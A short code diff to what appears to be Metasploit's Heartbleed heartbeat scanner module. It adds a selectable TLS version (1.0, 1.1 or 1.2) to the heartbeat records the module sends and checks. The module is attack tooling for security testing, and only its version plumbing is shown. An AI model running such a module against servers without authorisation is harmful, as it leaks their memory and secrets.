@@ -67,7 +67,11 @@ class Metasploit3 < Msf::Auxiliary
 
   HANDSHAKE_RECORD_TYPE = 0x16
   HEARTBEAT_RECORD_TYPE = 0x18
-  TLS_VERSION = 0x0302 # TLS 1.1
+  TLS_VERSION = {
+    '1.0' => 0x0301,
+    '1.1' => 0x0302,
+    '1.2' => 0x0303
+  }
 
   TTLS_CALLBACKS = {
     'SMTP'   => :tls_smtp,
@@ -111,7 +115,8 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(443),
-        OptEnum.new('STARTTLS', [true, 'Protocol to use with STARTTLS, None to avoid STARTTLS ', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3' ]])
+        OptEnum.new('STARTTLS', [true, 'Protocol to use with STARTTLS, None to avoid STARTTLS ', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3' ]]),
+        OptEnum.new('TLSVERSION', [true, 'TLS version to use', '1.1', ['1.0', '1.1', '1.2']])
       ], self.class)
   end
 
@@ -210,7 +215,7 @@ class Metasploit3 < Msf::Auxiliary
     version = unpacked[1] # must match the type from client_hello
     len = unpacked[2]
 
-    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION
+    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLSVERSION']]
       vprint_error("#{peer} - Unexpected Heartbeat response'")
       disconnect
       return
@@ -266,7 +271,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def ssl_record(type, data)
-    record = [type, TLS_VERSION, data.length].pack('Cnn')
+    record = [type, TLS_VERSION[datastore['TLSVERSION']], data.length].pack('Cnn')
     record << data
   end
 end
